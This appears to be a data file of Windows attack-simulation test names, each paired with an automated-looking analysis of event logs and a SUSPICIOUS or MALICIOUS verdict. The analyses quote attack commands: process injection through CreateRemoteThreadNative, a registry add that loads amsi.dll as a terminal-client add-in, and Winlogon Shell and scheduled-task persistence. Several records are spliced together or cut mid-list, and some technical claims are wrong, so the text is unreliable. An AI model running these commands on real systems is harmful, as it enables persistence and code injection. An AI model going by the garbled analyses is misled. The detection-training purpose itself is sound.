  powershell.exe & {$process = Start-Process C:\Windows\System32\werfault.exe -passthru C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\bin\x64\CreateRemoteThreadNative.exe -pid $process.Id -debug}
  ```
- **Suspicious Elements**:
  - The executable `CreateRemoteThreadNative.exe` is executed from a temporary directory, which is not typically where secure executables are stored.
  - The use of `CreateRemoteThreadNative.exe` with `-passthru` and `-debug` flags and the reference to an undocumented binary suggest potential memory manipulation, a technique often used in sophisticated attacks or malware.
  - Launching an executable like `werfault.exe` in this manner might be indicative of an attempt to exploit or disguise the execution.

### Application and System Logs

- **Windows Defender State**: The application log confirms that Windows Defender is active (`SECURITY_PRODUCT_STATE_ON`), which is beneficial for detecting malicious activity but does not, in itself, indicate an ongoing issue.

- **Time Changes**: The system logs note changes to the system time by `svchost.exe`, which although not inherently malicious, altering system times can be used to evade time-based security controls or manipulate timestamps.

- **Updates**: Logs indicate that Windows updates, including security intelligence updates for Microsoft Defender Antivirus, are occurring, which suggests the system is reasonably kept up-to-date.

### Sysmon Logs

- **Process Creation Events**: There is a process creation log for `werfault.exe` and attempts to execute utilities such as `wevtutil.exe` and `whoami.exe`. The integration with `CreateRemoteThreadNative.exe` is troubling.
- **Image Execution Context**: Multiple legitimate processes including `svchost.exe`, `whoami.exe`, and updates via `wuauclt.exe` are recorded, which typically would not raise concerns separately, but in combination with undocumented or suspect executables, they warrant further scrutiny.

### Security Logs

- **User Actions**: User `admin_test` appears frequently involved with processes, with high integrity level operations. Elevated privileges (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege` etc.) might be normal for admins but are suspicious in conjunction with anomalous PowerShell activity.

### Assessment and Recommendations

- **Assessment**: The combination of using PowerShell to run a process from a non-standard location (`CreateRemoteThreadNative.exe`), with elevated privileges and possibly non-standard use of legitimate processes (like `werfault.exe`), raises significant suspicion.
  
- **Threat/Risk Level**: This environment may be under active reconnaissance or attack, possibly involving advanced techniques like injecting code into legitimate processes (a hallmark of various malware families).

- **Guidance**:
  1. **Immediate Action**: Isolate the machine (`Server002`) for a deeper forensic investigation to avoid further potential spread of malicious activity.
  2. **Investigation**: Conduct a thorough analysis of `CreateRemoteThreadNative.exe` to determine its origin and purpose. Check the file hash against threat intelligence databases.
  3. **Audit**: Review recent administrative actions, user permissions, especially focusing on `admin_test` activity logs across the network.
  4. **Mitigation**: Increase monitoring and alerting on PowerShell execution. Consider implementing better PowerShell logging configurations (e.g., transcription logging).

### Resolution

  ```
  ""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default\Addins\Malware"" /v Name /t REG_SZ /d ""C:\Windows\System32\amsi.dll"" /f
  ```
  This indicates a registry modification related to terminal server client add-ins, which is unusual and potentially malicious if not expected as part of normal operation. The specific key name ""Malware"" raises suspicion.

- Subsequently, `reg.exe` was used to add a registry entry at the same path, confirming the registry modification attempts.

- A series of process executions involving common Windows executables like `whoami.exe` and `hostname.exe` were observed but do not immediately suggest malicious behavior without additional context.

### Application Log Analysis
- There are standard Microsoft Edge Update entries, showing updates related to Microsoft Edge. The logs show Edge Update setups, which typically indicate routine application updates.

### System Log Analysis
- The system logs contain several `svchost.exe` executions, adjusting system time based on the time source `time.windows.com`. These entries appear normal for time-synchronization operations and do not indicate any malicious activity.

### Analysis Summary
- **Suspicious Activity:** The command execution involving modifications to the registry with the clear key name ""Malware"" is a clear indicator of potential malicious intent or compromise. This could be part of an attack to maintain persistence or modify system behavior.
- **Benign Activity:** The majority of the additional logs, including system time updates and application updates, are consistent with legitimate system maintenance activities.
  
### Final Assessment: **MALICIOUS**
Given the modification of the registry with a suspicious command line involving ""Malware"", this indicates malicious activity. Immediate further investigation is warranted to verify the intent and potential impact of this modification, understand if more compromises exist within the network, and take corrective actions to remediate this potential compromise.

HKLM - Policy Settings Explorer Run Key,"### Analysis of the Logs

Upon reviewing the provided logs, here is a detailed analysis:

1. **Sysmon Log Analysis:**
   - **Frequent Execution of `wevtutil.exe` and `conhost.exe`:** The logs show multiple executions of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\\admin_test`. These tools are legitimate and part of Windows operations. `wevtutil.exe` is used to manage event logs and `conhost.exe` is a Console Window Host. However, frequent and rapid execution might indicate potential malicious activity, such as event log tampering or other system modifications.
   - **Execution of `hostname.exe` and `whoami.exe`:** These processes are used to gather basic system and user information. Typically, the usage of `whoami.exe` in particular could suggest reconnaissance activities by an attacker.
   - **Command-line Execution of PowerShell with Potential Malicious Intent:**
     - The logs indicate PowerShell usage with a command to create a registry key that would execute `calc.exe` at login (`HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run`). This is a persistence mechanism often used by malware and is a clear indicator of potentially malicious activity.

2. **Windows PowerShell Log Analysis:**
   - The logs confirm the execution of the aforementioned PowerShell script, reinforcing the suspicion of malicious intent. The goal appears to be establishing persistence by registering a typically benign application (`calc.exe`) which in more severe cases could be a placeholder for a more nefarious payload in a real-world attack.

3. **System Log Analysis:**
   - **Time Manipulation Detected:** There is evidence of time being manipulated on the system. The `NewTime` is set before the `OldTime` in the Kernel-General (Event ID 1) logs. This could be used to evade detection by tampering with log timestamps.

4. **Security Log Analysis:**
   - **High Privilege and NTLM Authentication Observed:** The account `admin_test` has elevated privileges, and multiple logon events via NTLM authentication are logged, which may not be malicious on their own but could be leveraged in conjunction with other activities.
   - **Logoff Event:** There is a log-off event occurring immediately before or after some of these actions, which may be an indicator that an unauthorized session was established and then terminated.

### Assessment and Conclusion

The combination of frequent execution of certain utilities, the PowerShell scripts creating persistence mechanisms in the registry, and the manipulation of system time indicate suspicious and likely malicious behavior. The use of `calc.exe` may seem benign but is often used in scripts as a test mechanism which in a full attack could be replaced with harmful software.

### Resolution

**MALICIOUS.** The evidence strongly suggests that there was an attempt to manipulate the system for unauthorized purposes, most notably through the PowerShell script intending to create a persistence mechanism. This activity requires immediate attention and remediation.

   - Perform a full malware scan and apply any pending system updates.

3. **Monitoring and Hardening:**
   - Tighten PowerShell execution policies to prevent unapproved scripts from running.
   - Continuously monitor for further unauthorized changes or suspicious behaviors using SIEM tools.
   - Educate users on recognizing phishing and social engineering tactics that could lead to such compromises."
Snake Malware Kernel Driver Comadmin,"After carefully analyzing the logs provided, here's a detailed analysis of the context, components, and activities observed:

### PowerShell Log Analysis
- **Observed Process**: Usage of PowerShell to create a directory and file (`comadmin.dat`) within the `C:\\Windows\\system32\\Com\\` path. This involves generating random bytes and then writing them to a file.
- **Suspicious Behavior**: The script creates directories and writes random bytes to a file in the system directory, which is a known technique used to drop and execute malicious or masquerading files.

### Application Log Analysis
- **Observed Process**: Stopping of the `edgeupdate` service. This action is typically benign as it relates to the Microsoft Edge update process. Stopping the service is not inherently malicious or indicative of compromise.

### Sysmon Log Analysis
- **Observed Processes**: Multiple executions of native Windows binaries such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `powershell.exe`, and several instances of Microsoft Edge Update processes.
- **Potentially Suspicious Behavior**: The use of legitimate system utilities in a chain-like sequence, especially the PowerShell script, could suggest abuse of living-off-the-land tactics to conduct actions on objectives discreetly.
- **Repeated Execution**: Observations include frequent executions of Microsoft Edge Update indicating regular update activities which align with automated software update procedures by Microsoft.

### Assessment of Activities
1. **PowerShell Activities**:
   - **Suspicious**: The creation and storing of a `comadmin.dat` file in the `system32` directory using random data, could be an attempt to plant malicious binaries or engage in data hiding practices.

2. **Microsoft Edge Update Activities**:
   - **Benign**: Numerous logs concerning Microsoft Edge Update executions. These are consistent with system updates being managed and maintained.

### Conclusion
The PowerShell activity involving file operations in the `system32` directory is suspicious and warrants further investigation. This behavior can be indicative of potential malware persistence mechanisms or preparation for further malicious activity that could integrate or hide within legitimate processes. However, the Edge Update Service events appear routine and do not indicate malicious activity.

### Resolution
- **Resolution**: **SUSPICIOUS**
- **Recommended Actions**:
  - Conduct deeper inspection of the system for unauthorized changes or additional unknown files in the `system32` directory.
  - Monitor and review any other systems running similar PowerShell scripts or exhibiting unexpected behavior.
  - Evaluate if any unauthorized users or processes are associated with the PowerShell activity to rule out false positives.

Parent PID Spoofing - Spawn from Current Process,"**Analysis of Logs:**

1. **Windows PowerShell Log:**
   - All PowerShell events show a recurring pattern of executing a script `{Start-ATHProcessUnderSpecificParent}` with the intent to start a new PowerShell process and execute `Start-Sleep 10`. The specific command used, involving `$Env:windir\System32\WindowsPowerShell\v1.0\powershell.exe`, suggests the use of a legitimate executable.
   - The command seems to aim at process spawning potentially under a specific parent process, and while the `Start-Sleep` command itself isn't harmful, the presence of `Start-ATHProcessUnderSpecificParent` functions may indicate testing or an attempt to use PowerShell for more controlled process execution, potentially evading detection.

2. **System Log:**
   - Predominantly contains Windows Update events and other regular system activities. The updates for typical Microsoft applications like Microsoft Camera, YourPhone, and others do not appear suspicious.

3. **Sysmon Log:**
   - The presence of multiple `wevtutil.exe` and `conhost.exe` executions with high integrity levels is noted. `wevtutil.exe` is a legitimate tool used to manage event logs and may indicate legitimate administrative tasks or be a sign of log clearing if used maliciously.
   - Multiple `whoami.exe` and `hostname.exe` executions suggest efforts to gather system information. This activity is not inherently malicious but can be indicative of monitoring activities or preparatory steps for further actions.
   - The PowerShell process observed in Sysmon matches the suspicious command seen in the PowerShell logs.

4. **Security Log:**
   - Series of Event IDs associated with credentials (`5379`) and logon (`4624` and `4672`) events, showing access and insertion attempts with Microsoft accounts. The `3221226021` return code (STATUS_LOGON_FAILURE) suggests repeated unsuccessful attempts to access a resource or service.
   - The `4672` event, which indicates special privileges being assigned to a new logon session for the SYSTEM account, is a standard event when services start and does not indicate privilege escalation by itself.

5. **Application Log:**
   - Contains entries related to the Software Protection Platform Service (`sppsvc`), which is responsible for handling licensing of Windows and its components. No suspicious activity is noted here.

**Assessment:**

- **Suspicious Activity:** The use of `Start-ATHProcessUnderSpecificParent` in PowerShell suggests potential attempts for controlled execution environments possibly to evade security mechanisms but lacks context or follow-up malicious activities.
- **Potential Misuse of Legitimate Tools:** The `wevtutil`, `hostname`, and `whoami` executions could indicate legitimate administrative actions or reconnaissance activities.

Given the information provided, there is evidence of a sophisticated attempt to utilize legitimate processes and commands in ways common for benign uses but possibly indicating a subtle form of monitoring or reconnaissance.

**Resolution:** **SUSPICIOUS**
- The behavior should be closely investigated further, focusing on the intent behind the repetitive PowerShell usage and event log management commands.
- Recommend increased monitoring of the system for follow-up actions and potential lateral movements or privilege escalations.
- Consider implementing additional PowerShell logging and restrict unauthorized or unnecessary PowerShell executions to mitigate risks.

Additional data points, such as network activity or file system alterations, could provide more insight into determining the full risk scope and potential escalation into a confirmed malicious activity."
Access Token Manipulation,"### Detailed Analysis:

**Suspicious or Anomalous Behavior:**

1. **PowerShell Activity:**
   - A PowerShell command with `Set-ExecutionPolicy -Scope Process Bypass -Force` was executed. This command line execution policy allowing scripts to run without restrictions is generally suspicious, especially in environments where restrictive policies are the norm.
   - The script executed, `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.002\\src\\GetToken.ps1`, contains a piece of code that suggests possible token impersonation (`[MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,\""cmd.exe\"")`), which can be an indicator of privilege escalation attempts or unauthorized access to the LSASS process that is known to store sensitive data like users' passwords.

2. **Process Creation:**
   - Frequent use of `whoami.exe` and `hostname.exe` appears in the logs. While in isolation, these are benign; repeated execution in a short span may indicate that someone is trying to ascertain user and system information, possibly with intentions to exploit vulnerabilities.
   - The Sysmon logs show the execution of Microsoft Edge updater processes, which is normal routine service activity. However, the presence of temporary directories and numerous spawn processes suggest checking for necessary updates and its legitimacy to ensure there's no exploitation using trusted applications.

**Indicators of Malicious Activity or Compromise:**

- The PowerShell script and its behavior are highly indicative of potential malicious activity or exploration of how to escalate privileges or access restricted data. The attempt to retrieve the owner of processes and target the LSASS process is particularly concerning.

- The logs show multiple `conhost.exe` executions accompanying other legitimate processes, which is normal, but the context of frequency and association with PowerShell script suggest further examination into these spawned instances.

**Assessment:**
Based on the presented logs and the activities described above, the indicators strongly suggest a potential malicious activity or breach. The PowerShell execution behavior alone is sufficient to warrant serious concern.

**Resolution: MALICIOUS**

### Recommendations:
- **Immediate Containment:**
  - Disconnect the affected host from the network to prevent any further potential activities that may compromise the network.
  - Conduct a thorough examination of memory and system processes, particularly targeting LSASS, to identify unauthorized access.

- **Investigation and Forensics:**
  - Analyze the script `GetToken.ps1` to understand its full functionality and whether it achieved any credential theft or unauthorized access.
  - Review user activity logs to trace any anomalous access patterns before and after the detected incidents.
  
- **Remediation:**
  - Reset passwords for affected accounts and any accounts with administrative privileges on the machine.
  - Conduct a virus and malware scan, particularly looking for advanced threats.
  
- **Enhance Security Posture:**
  - Enforce stricter PowerShell policies and consider implementing logging and monitoring solutions for PowerShell activities.
  - Implement EDR (Endpoint Detection and Response) solutions to better monitor and respond to such threats in the future.

- **Report and Document:**
  - Report the incident as per organizational policy and document findings to strengthen incident response strategies for future incidents."
HKLM - Modify default System Shell - Winlogon Shell KEY Value,"After analyzing the provided event logs, several potentially suspicious activities have been identified:

1. **PowerShell Activity**:
   - Multiple PowerShell events show execution of commands involving the modification of registry keys related to the Windows Shell. Specifically, a script that backs up and alters the `Shell` key in the `Winlogon` registry path was executed:
     `""Set-ItemProperty -Path \""HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"" -Name \""Shell\"" -Value \""$newvalue\""""`
   - Modifying the `Shell` registry key can be used for persistence or malicious activities, where a malicious program could be set to run at user logon.

2. **Sysmon Logs**:
   - Multiple instances of `wevtutil.exe` and `conhost.exe` were observed. While not inherently malicious, frequent and continuous usage without clear context could imply log deletion or tampering.
   - A `whoami.exe` process was logged, which could be part of recon activities when observed out of ordinary contexts.
   - Numerous processes related to Microsoft Edge Update workflows were observed. While these can be legitimate update activities, the voluminous entries relating to MicrosoftEdgeUpdate raise suspicion due to potential misuse for unauthorized software installation or update tampering.

3. **Security Logs**:
   - Event 4672 shows that the user `admin_test` was granted several notable privileges, such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others. While this can be normal for an admin account, if `admin_test` is not expected to execute enhanced privileges regularly, this can suggest privilege escalation attempts.
   - The logon session using NTLM seen in Event 4624 from a named workstation (`DESKTOP-3HL5B2P`) may indicate a remote logon which, if atypical for this user or system, could be suspicious.

4. **System and Application Logs**:
   - A time discrepancy was noted, with events showing the system time being modified backward, which could indicate attempts to manipulate logs or alter timestamps for malicious obfuscation.

In summary, the combination of these events suggests suspicious behavior that necessitates further investigation. The alteration of critical registry entries, execution of several command-line tools like `whoami` and registry modification using PowerShell, and privilege escalation for `admin_test` raises red flags that cannot be ignored. Moreover, manipulations related to system time could aim to cover tracks.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
- Conduct a thorough review of the user `admin_test` activities, focusing on unexpected behaviors or unauthorized operations.
- Verify the integrity and authenticity of the PowerShell scripts and ensure these registry changes align with legitimate administrative tasks.
- Investigate the origin and necessity of the numerous Microsoft Edge Update processes, ensuring no unauthorized software changes were made.
- Review network logs derived from the NTLM login sessions to detect any unusual remote logins or access patterns.
- Assess the reason and legitimacy behind the backward system time change, consulting with engineering or admin staff.

Based on these findings, engage IT and security teams for actions like access revocation and comprehensive endpoint checks. Consider employing enhanced monitoring on this host and similar assets within the environment."
Parent PID Spoofing using PowerShell,"Upon analyzing the provided Windows event logs, several indicators suggest potentially suspicious or malicious activity. Here are the key points of investigation:

1. **Security Logs:**
   - **Event 4624**: This event, indicating a logon, appears multiple times without any direct anomalies, as it shows logon type 5, which signifies a service startup. However, repeatedly accessing the SYSTEM account can be red-flagged when investigated in correlation with other events.
   - **Event 4672**: This event indicates special privileges were assigned. SYSTEM account already holds extensive privileges, but monitoring the timing and processes might help identify abuse.
   - **Event 5379**: This event shows unsuccessful credential validation attempts, with the ReturnCode suggesting failure. Frequent failures could indicate an attempt to access data or accounts illegitimately.

2. **Sysmon Logs:**
   - **Process Creation**: There are multiple entries for PowerShell (e.g., running a script `PPID-Spoof.ps1`), a known method for performing malicious tasks by evading detection by spoofing the process ID of explorer.exe. The command executed also mentions spawning a process `iexplore.exe` and loading a DLL `calc.dll`, often associated with injection tactics, which is a significant red flag for exploitation activities.
   - **Process Activity**: Frequent call-ups to `conhost.exe`, `wevtutil.exe`, and other uncommon processes for typical user activity suggest suspicious system configuration alterations or attempts to hide activities.
   - **Network Service Activity**: Presence of atypical executables like `RUXIMICS.exe` under high integrity and SYSTEM level can be suspicious if not accounted for. Lack of source and unusual invocation context such as unsigned or in atypical directories may indicate potential malicious code execution.

3. **Windows PowerShell Logs:**
   - The entries reveal a PowerShell script being executed from a temporary directory. The script `PPID-Spoof.ps1` disguises activities to appear as if originating from legitimate processes, a tactic consistent with attempts to carry out malicious actions without triggering alarms.

**Assessment:**
- The presence of PowerShell script activity with PPID Spoofing, combined with the invocation of a DLL into an Internet Explorer process, alongside unsuccessful credential validation attempts, is indicative of potential malicious actions.
- These activities suggest either post-exploitation movement within the system or attempts to execute unauthorized actions under the guise of legitimate processes.

**Resolution: SUSPICIOUS**
- Given the nature of observed activities, they warrant further in-depth investigation. Not all activities decisively point to malicious intent (some might be attributable to administrative tasks or legitimate scripts in certain environments). However, the likelihood of compromise or misuse necessitates a cautious approach.
- Further actions should include isolating the affected system, conducting a malware scan, and reviewing system configs, especially any scripts or processes initiating from temporary or non-standard locations. Blocking suspicious IPs and conducting a more thorough review of access logs is also recommended."
At.exe Scheduled task,"**Analysis of Windows Event Logs:**

1. **Security Log Analysis:**
   - The security logs contain Event ID 4616, which signifies a change in system time. This event occurs twice, indicating system time adjustments by the LOCAL SERVICE account via the process svchost.exe. This is common for time synchronization services; thus, this alone doesn't raise immediate concerns.

2. **Application Log Analysis:**
   - The application log entry is related to the Software Protection Platform Service. There are no abnormal behaviors, anomalies, or error messages related to licensing or activation, so this entry appears benign.

3. **Sysmon Log Analysis:**
    - Multiple process creations involving `wevtutil.exe` (events 17939, 17947, 17951, 17955) and `conhost.exe` (events 17940, 17944, 17948, 17956) by the user `admin_test`. These processes are typically used for legitimate purposes like querying event logs and hosting console applications, respectively. However, the frequency and user context suggest a need to check the legitimacy of these executions.
    - Execution of `HOSTNAME.EXE` and `whoami.exe`, which are benign if used for normal administrative or troubleshooting operations.
    - Notably, `cmd.exe` was executed with command `/c at 13:20 /interactive cmd` (Event 17965), which indicates scheduling a task to spawn a command prompt with interactive rights. This is suspicious because it can be used to maintain persistence or elevate privileges without direct user interaction.
    - Event 17966 shows `conhost.exe` running under this scheduled task, strengthening the suspicion that `cmd.exe` was used in a potentially malicious context.
    - `at.exe` is used for scheduling tasks (Event 17967), and its presence connected with `cmd.exe` further points to an attempt to schedule a command session for interactive use, a known technique for persistent and elevated access.

4. **System Log Analysis:**
   - The system logs also note time changes, matching the security event log's entries and adding context. This smoothly aligns with standard operations, usually linked with service account actions for time setting.

5. **Windows PowerShell Log Analysis:**
   - No entries noted in the provided data

**Assessment and Conclusion:**

While the logs largely show routine activities common in administrative scenarios, the use of `cmd.exe` with specific command lines to schedule interactive sessions raises a red flag for potential privilege escalation or an unauthorized persistent backdoor.

**Resolution: SUSPICIOUS**

Given these observations:
- **Investigate further**:
  - Verify with system admins if any of these tasks were known or approved.
  - Review the `admin_test` user's recent activity and justification for executing these command-line strings.
  - Check for additional scheduled tasks set up around the same period and any unauthorized modifications to user access rights.
  
This flagged behavior mandates closer inspection to determine the intent and legitimacy of the commands used."
Domain Password Policy Check: No Lowercase Character in Password,"Upon analyzing the provided Windows event logs, several points stand out that warrant further attention:

1. **Microsoft Edge Installer Activity**: Throughout the Sysmon logs, there are multiple entries related to the execution of ""Microsoft Edge Installer."" The commands are executed under the `NT AUTHORITY\SYSTEM` account, suggesting system-level installations or updates of Microsoft Edge. This behavior on its own isn't necessarily malicious, especially given the legitimate file paths and Microsoft signatures. However, it is crucial to verify if this aligns with scheduled updates by your organization; if not, it could indicate unauthorized software installation.

2. **PowerShell Activity**: There is a PowerShell script executed by a user with high integrity (`SERVER002\admin_test`). The script is involved in checking and potentially changing the user password (`Set-ADAccountPassword`). It is notable for:
   - Reading a locally stored credential file.
   - Comparing stored and new passwords.
   - Logging password change success and errors.

   Changing passwords via scripts is a sensitive operation and could be part of a legitimate administrative task or a security measure. However, it can also be indicative of an attempt at unauthorized credential management, especially if the activity was not sanctioned or expected.

3. **Repeated Use of `wevtutil.exe` and `conhost.exe`**: The log shows frequent invocations of `wevtutil.exe` and `conhost.exe` by the `SERVER002\admin_test` user. `wevtutil.exe` is used to manage event logs, and repeated usage could imply log tampering or log clearing attempts. `conhost.exe`, a legitimate system utility, is often used with command-line operations. The context and frequency of use in the logs might suggest uncommon behavior that demands further scrutiny.

**Assessment and Resolution:**

- **Suspicious PowerShell Script Execution**: The password management script could have significant security implications. It needs further investigation to confirm its legitimacy and purpose within the organization.

- **System Utility Usage**: The repeated use of `wevtutil.exe` combined with `conhost.exe` is unusual, particularly in such frequency, and should be investigated to confirm whether it was part of an authorized maintenance or system management activity.

**Resolution**: The logs exhibit activity that appears suspicious given the context:
- The PowerShell script handling credentials.
- The systemic usage of system utilities that can influence log data and system operations.

Therefore, the resolution is **SUSPICIOUS**. Further investigation is necessary, focusing on:
1. Verifying the legitimacy of the PowerShell script execution.
2. Confirming if the Microsoft Edge installations were scheduled and legitimate.
3. Investigating the usage context of `wevtutil.exe` to assess potential unauthorized actions and determine if any logs were tampered with or events were hidden.

Proceed with reviewing any security policy violations or user actions around the times these logs were recorded to understand the full extent of any risk or exposure."
Juicy Potato,"Based on the Windows event logs provided, we need to assess if there's any suspicious or malicious activity. Here is a breakdown of key findings:

1. **Sysmon Logs:**
   - Multiple entries show the execution of `MicrosoftEdgeUpdate.exe` with various command-line arguments. The frequent and varied executions indicate an active update process, which is normal for maintaining browser health (`FileVersion` shows legitimate Microsoft Edge Update processes).
   - However, there are concerning entries with regard to new executions of `PowerShell.exe` and `cmd.exe`, especially those appearing to execute scripts from `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script.exe`, which is highly unusual and could indicate the presence of a malicious script.
   - The `""CommandLine"":""\""powershell.exe\"" & {cmd ...}""` suggests an execution attempt of PowerShell and CMD commands, which, combined with the environment of execution (temp storage and use of potentially suspicious files), could lead to compromise.
   
2. **Windows PowerShell Logs:**
   - The logs describe executions of PowerShell leveraging command-line with external files. Specifically, `script.exe` is executed from a temporary and obfuscated directory path, which is often used by malware to evade detection.
   - The logs consistent with launching potentially undesirable scripts through PowerShell strengthens indicators of potentially malicious activity.

3. **General Observations:**
   - The consistent use of PowerShell with command-line arguments to execute scripts from transient directories within the Temp folder is unusual for standard operations and may point toward an ongoing attack or infection process.
   - There is a notable absence of related benign events that together might rationalize these commands' origins and objectives.

4. **System and Application Logs:**
   - Generally show routine activity with services being started or stopped.
   - Windows Defender logging status as `SECURITY_PRODUCT_STATE_ON` suggests active antivirus protection on the system, possibly detecting or preventing some actions from escalating.

**Conclusion and Recommendations:**

- **Resolution:** **MALICIOUS**
  - The execution of scripts from obfuscated paths via PowerShell and command-line usage within Temp directories is suspicious and indicative of possible malicious activity.
  
**Guidance:**
- Immediately investigate the origin of the script located in `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script.exe`. Determine its functionality and any connections to known malware.
- Perform a full antivirus and anti-malware scan of the system to identify and mitigate potential threats.
- Examine security configurations and scripting policies to limit the execution of scripts from untrusted directories.
- Monitor and audit PowerShell usage for unauthorized script execution or deviations from baseline behavior.
- Implement network isolation if necessary, and perform threat hunting to ensure similar patterns aren't present across other systems."
Change Startup Folder - HKLM Modify User Shell Folders Common Startup Value,"Based on a comprehensive analysis of the provided event logs from a Windows host, here are the key findings:

1. **PowerShell Activity**:
   - Logs show a PowerShell command executed to create a directory in the temporary folder, copy `calc.exe` to that directory, and modify registry keys to change the ""Common Startup"" path to the newly created directory. This behavior can be indicative of an attempt to establish persistence by modifying startup configurations which is a known tactic used in malware infections.
  
2. **Sysmon and Security Events**:
   - Multiple Sysmon logs indicate the execution of legitimate Windows processes such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `powershell.exe` by a user `admin_test`. However, the specific PowerShell command referenced earlier stands out due to its potential to be used maliciously.
   - The consistent use of `NT AUTHORITY\SYSTEM` and `SYSTEM` level integrity processes for Microsoft Edge's updates reflect routine system operations for updates from Microsoft Edge Update, although they might occasionally be exploited by attackers masquerading as legitimate software.

3. **EdgeUpdate Behavior**:
   - Repeated stop service events for EdgeUpdate could be normal, especially if such updates were being performed as part of legitimate administrative activity. However, combined with other logs, it may need further investigation to ensure that no unauthorized actions are masqueraded under the guise of updates.

**Assessment**:

- **Suspicious Activity**: The PowerShell log entries wherein system configurations seem to be altered to start `calc.exe` from a non-standard location during boot time, suggest actions potentially related to unauthorized persistence mechanisms.
  
**Resolution**:
- **SUSPICIOUS**: The identified activity involving registry modification and persistence setting via PowerShell is suspicious and warrants further manual investigation. While there are legitimate update processes occurring as inferred from the EdgeUpdate logs, the PowerShell activity needs to be scrutinized to rule out unauthorized or malicious intent.

**Recommended Actions**:
- Conduct a detailed forensic follow-up to determine who executed the suspicious PowerShell script and under what context.
- Review user `admin_test` activity logs and authenticate their actions.
- Check system integrity and scan for any known malicious signatures associated with persistence via startup folder modifications.
- Review recent changes to the system configuration, especially focusing on registry and startup entries."
Suspicious vbs file run from startup Folder,"Based on the provided logs, let's analyze each and determine if there are any indicators of potentially malicious activity:

### Windows PowerShell Logs
1. The logs indicate the execution of a PowerShell script that performs several actions:
   - Copies a Visual Basic Script (`vbsstartup.vbs`) from a temporary location to the startup directory in two different locations.
   - Executes the copied script using `cscript.exe`.

   **Analysis**: 
   - Copying a script to a startup location is a common persistence technique used by malicious actors to ensure that the script runs whenever the system starts.
   - The use of `cscript.exe` to execute scripts is not inherently malicious but, combined with the script location in the startup path, suggests an attempt to gain persistence on the system.

### Sysmon Logs
1. Multiple occurrences of common system utilities (e.g., `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`) being executed by a user account, namely `SERVER002\\admin_test`.
2. The execution of `cscript.exe` to run `vbsstartup.vbs` by the `admin_test` user is noted, matching the PowerShell log activity.

   **Analysis**:
   - Regular execution of utilities like `whoami.exe` and `hostname.exe` could be benign, possibly used by scripts or automated tasks.
   - The consistent use of `cscript.exe` following the PowerShell activity points towards the persistence attempt observed in the PowerShell log.

### Security Logs
1. Time manipulation events (ID 4616) with the subject `LOCAL SERVICE` but no additional context to suggest unauthorized changes.

### System Logs
1. Kernel time-related activities, potentially synchronizing system time, seem normal.

### Assessment
- **Persistence Mechanism**: Copying `vbsstartup.vbs` to startup directories and executing it with `cscript` suggests a persistence attempt.
- **Command Line Arguments**: The PowerShell script executed with suspicious command-line arguments aiming for persistence.
- **Consistency Across Logs**: PowerShell, Sysmon, and minimal Security logs all point towards scripting activity likely unauthorized if not explicitly expected or created by legitimate system administrators.

### Conclusion
The activities described exhibit classic signs of potentially malicious activity, primarily focused on gaining persistence through startup script execution. Given that there is no explicit indication that these actions are sanctioned by the system's administration policies or expected behavior:

- **Resolution**: **MALICIOUS**

### Recommendations
1. Investigate the origin of `vbsstartup.vbs` and review its contents.
2. Check user activity, especially under `SERVER002\\admin_test`, for any unauthorized access or activities.
3. Scan the system for additional indicators of compromise.
4. Review startup items and scheduled tasks for anomalies.
5. Implement strict script execution policies and monitor PowerShell usage."
PowerShell Modify A Scheduled Task,"Based on the analysis of the provided Windows event logs, several indicators suggest suspicious and potentially malicious activity on the host ""Server002"". Let's highlight the key findings:

1. **PowerShell Events Analysis:**
   - The PowerShell logs show multiple instances where a script executed commands to create and modify a scheduled task, setting it with high privileges (BUILTIN\Administrators) to run at logon. This task initially executed `cmd.exe` and was later altered to run `Notepad.exe`.
   - The sequence and actions logged (Event ID 600) are indicative of unusual and potentially malicious behavior, as they demonstrate the creation of a task intended to gain persistent access or execute unauthorized commands with elevated privileges.

2. **Sysmon Events Analysis:**
   - The Sysmon logs show that `wevtutil.exe` and `conhost.exe` processes were being called by the user ""SERVER002\admin_test"" multiple times in quick succession.
   - Notably, the creation of a PowerShell instance executing the previously mentioned script (Event ID 1) confirms suspicious activity. PowerShell is commonly used in attacks due to its powerful capabilities and integration within Windows systems.
   - Commands executed by PowerShell and the use of the ""High"" integrity level further underline potential misuse, as the actions are likely leveraged to alter the system state or extract sensitive information.

3. **Security and System Logs Analysis:**
   - A critical observation is the logged time anomaly, showcasing a shift in system time (Event ID 4616). Time manipulation is often a technique employed by attackers to cover their tracks or evade detection.
   - The security logs identify privileged logon sessions and rights being assigned to the user ""admin_test"", including powerful privileges like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others commonly sought after during privilege escalation attempts.

**Assessment and Resolution:**

Given the above findings, the activities logged indicate a series of orchestrated events that align closely with tactics employed during an attack, specifically involving privilege escalation and persistence mechanisms. The use of PowerShell to create scheduled tasks with elevated privileges, as well as the time alteration, strongly suggests an attempt to compromise or maintain unauthorized access to the system.

   - Regularly review and audit privileges and scheduled tasks using automated tools.
   - Ensure continuous monitoring for similar patterns, enhancing alerting mechanisms based on this event's signatures.

These actions and a comprehensive incident response plan shall mitigate immediate threats and bolster future resilience against similar attacks."
Suspicious jse file run from startup Folder,"Upon analyzing the provided logs, several potential indicators of malicious activity have been observed:

1. **Security Log Events (Event ID: 4616)**:
   - These events indicate changes in system time by the `svchost.exe` process under the `LOCAL SERVICE` account. Frequent or unauthorized time changes can sometimes be used in an attempt to manipulate log timestamps to cover up illicit activities.

2. **Windows PowerShell Activities**:
